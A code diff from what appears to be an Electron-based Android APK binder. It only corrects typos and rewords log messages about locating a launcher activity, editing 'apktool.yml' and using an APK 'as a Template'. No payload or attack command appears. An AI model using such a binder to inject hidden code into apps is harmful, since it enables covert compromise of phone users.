@@ -5561,12 +5561,12 @@ app.controller("AppCtrl", ($scope) => {
                   var launcherPath = stdout.substring(stdout.indexOf(".\\") + 2).trim("\n");
                   if (error !== null) {
                       $appCtrl.Log("Unable to Locate the Launcher Activity...", CONSTANTS.logStatus.FAIL);
-                      $appCtrl.Log('Please use the "On Boot" Method to use This APK as a Temaplate!', CONSTANTS.logStatus.INFO);
+                      $appCtrl.Log('Please use the "On Boot" Method to use This APK as a Template!', CONSTANTS.logStatus.INFO);
                       $appCtrl.Log();
                       return;
                   } else if (!launcherPath) {
                       $appCtrl.Log("Unable to Locate the Launcher Activity...", CONSTANTS.logStatus.FAIL);
-                      $appCtrl.Log('Please use the "On Boot" Method to use This APK as a Temaplate!', CONSTANTS.logStatus.INFO);
+                      $appCtrl.Log('Please use the "On Boot" Method to use This APK as a Template!', CONSTANTS.logStatus.INFO);
                       $appCtrl.Log();
                       return;
                   } else {
@@ -5579,7 +5579,7 @@ app.controller("AppCtrl", ($scope) => {
                   fs.readFile(path.join(apkFolder, launcherPath), 'utf8', (error, data) => {
                       if (error) {
                           $appCtrl.Log('Reading Launcher Activity Failed!', CONSTANTS.logStatus.FAIL);
-                          $appCtrl.Log('Please use the "On Boot" Method to use This APK as a Temaplate!', CONSTANTS.logStatus.INFO);
+                          $appCtrl.Log('Please use the "On Boot" Method to use This APK as a Template!', CONSTANTS.logStatus.INFO);
                           $appCtrl.Log();
                           return;
                           }
@@ -5622,7 +5622,7 @@ app.controller("AppCtrl", ($scope) => {
 
                                     fs.readFile(path.join(apkFolder, 'apktool.yml'), 'utf8', (error, data) => {
                                       if (error) {
-                                          $appCtrl.Log("Reading the 'apktool.yml' Target SDK Failed!");
+                                          $appCtrl.Log("Modifying the 'apktool.yml' Target SDK Failed!");
                                           $appCtrl.Log();
                                           return;
                                       }
@@ -5677,12 +5677,12 @@ app.controller("AppCtrl", ($scope) => {
                   var launcherPath = stdout.substring(stdout.indexOf("./") + 2).trim("\n");
                   if (error !== null) {
                       $appCtrl.Log("Unable to Locate the Launcher Activity...", CONSTANTS.logStatus.FAIL);
-                      $appCtrl.Log('Please use the "On Boot" Method to use This APK as a Temaplate!', CONSTANTS.logStatus.INFO);
+                      $appCtrl.Log('Please use the "On Boot" Method to use This APK as a Template!', CONSTANTS.logStatus.INFO);
                       $appCtrl.Log();
                       return;
                   } else if (!launcherPath) {
                       $appCtrl.Log("Unable to Locate the Launcher Activity...", CONSTANTS.logStatus.FAIL);
-                      $appCtrl.Log('Please use the "On Boot" Method to use This APK as a Temaplate!', CONSTANTS.logStatus.INFO);
+                      $appCtrl.Log('Please use the "On Boot" Method to use This APK as a Template!', CONSTANTS.logStatus.INFO);
                       $appCtrl.Log();
                       return;
                   } else {
@@ -5690,12 +5690,12 @@ app.controller("AppCtrl", ($scope) => {
                       $appCtrl.Log();
                   }
 
-                  $appCtrl.Log("Fetching Launcher Activity...")
+                  $appCtrl.Log("Reading Launcher Activity...")
                   $appCtrl.Log();
                   fs.readFile(path.join(apkFolder, launcherPath), 'utf8', (error, data) => {
                       if (error) {
                           $appCtrl.Log('Reading Launcher Activity Failed!', CONSTANTS.logStatus.FAIL);
-                          $appCtrl.Log('Please use the "On Boot" Method to use This APK as a Temaplate!', CONSTANTS.logStatus.INFO);
+                          $appCtrl.Log('Please use the "On Boot" Method to use This APK as a Template!', CONSTANTS.logStatus.INFO);
                           $appCtrl.Log();
                           return;
                       }
@@ -5738,7 +5738,7 @@ app.controller("AppCtrl", ($scope) => {
 
                                 fs.readFile(path.join(apkFolder, 'apktool.yml'), 'utf8', (error, data) => {
                                   if (error) {
-                                      $appCtrl.Log("Reading the 'apktool.yml' Target SDK Failed!");
+                                      $appCtrl.Log("Modifying the 'apktool.yml' Target SDK Failed!");
                                       $appCtrl.Log();
                                       return;
                                   }
@@ -5794,12 +5794,12 @@ app.controller("AppCtrl", ($scope) => {
                       var launcherPath = stdout.split(apkFolder).pop(".smali").trim("\n").replace(/^\/+/g, '');
                       if (error !== null) {
                           $appCtrl.Log("Unable to Locate the Launcher Activity...", CONSTANTS.logStatus.FAIL);
-                          $appCtrl.Log('Please use the "On Boot" Method to use This APK as a Temaplate!', CONSTANTS.logStatus.INFO);
+                          $appCtrl.Log('Please use the "On Boot" Method to use This APK as a Template!', CONSTANTS.logStatus.INFO);
                           $appCtrl.Log();
                           return;
                       } else if (!launcherPath) {
                           $appCtrl.Log("Unable to Locate the Launcher Activity...", CONSTANTS.logStatus.FAIL);
-                          $appCtrl.Log('Please use the "On Boot" Method to use This APK as a Temaplate!', CONSTANTS.logStatus.INFO);
+                          $appCtrl.Log('Please use the "On Boot" Method to use This APK as a Template!', CONSTANTS.logStatus.INFO);
                           $appCtrl.Log();
                           return;
                       } else {
@@ -5807,12 +5807,12 @@ app.controller("AppCtrl", ($scope) => {
                           $appCtrl.Log();
                       }
 
-                      $appCtrl.Log("Fetching Launcher Activity...");
+                      $appCtrl.Log("Reading Launcher Activity...");
                       $appCtrl.Log();
                       fs.readFile(path.join(apkFolder, launcherPath), 'utf8', (error, data) => {
                           if (error) {
                               $appCtrl.Log('Reading Launcher Activity Failed!', CONSTANTS.logStatus.FAILED);
-                              $appCtrl.Log('Please use the "On Boot" Method to use This APK as a Temaplate!', CONSTANTS.logStatus.INFO);
+                              $appCtrl.Log('Please use the "On Boot" Method to use This APK as a Template!', CONSTANTS.logStatus.INFO);
                               $appCtrl.Log();
                               return;
                           }
@@ -5855,7 +5855,7 @@ app.controller("AppCtrl", ($scope) => {
 
                                     fs.readFile(path.join(apkFolder, 'apktool.yml'), 'utf8', (error, data) => {
                                       if (error) {
-                                          $appCtrl.Log("Reading the 'apktool.yml' Target SDK Failed!");
+                                          $appCtrl.Log("Modifying the 'apktool.yml' Target SDK Failed!");
                                           $appCtrl.Log();
                                           return;
                                       }
